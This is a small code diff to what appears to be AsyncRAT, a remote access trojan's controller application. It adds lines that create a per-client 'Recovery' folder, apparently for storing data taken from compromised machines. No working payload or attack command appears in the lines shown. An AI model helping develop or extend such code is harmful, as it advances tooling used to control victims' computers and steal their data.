@@ -721,6 +721,9 @@ namespace AsyncRAT_Sharp
                     {
                         Clients client = (Clients)itm.Tag;
                         client.LV.ForeColor = Color.Red;
+                        string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID + "\\Recovery");
+                        if (!Directory.Exists(fullPath))
+                            Directory.CreateDirectory(fullPath);
                         ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
                 }
